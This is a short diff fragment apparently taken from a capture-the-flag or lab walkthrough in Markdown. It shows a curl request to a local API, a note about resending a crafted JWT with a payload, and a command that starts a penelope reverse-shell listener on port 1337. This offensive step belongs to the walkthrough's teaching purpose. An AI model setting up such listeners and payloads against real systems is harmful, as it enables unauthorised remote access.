@@ -451,4 +451,11 @@ curl -X POST -s http://127.0.0.1:30080/api/v1/tools -H 'Content-Type: applicatio
 }
 ```
 
-Ill use the same request as before whe
+Ill use the same request as before when i first crafted the JWT, but this time ill pass the payload as data
+
+```python
+penelope -p 1337
+```
+
+Then ill start a listener 
+
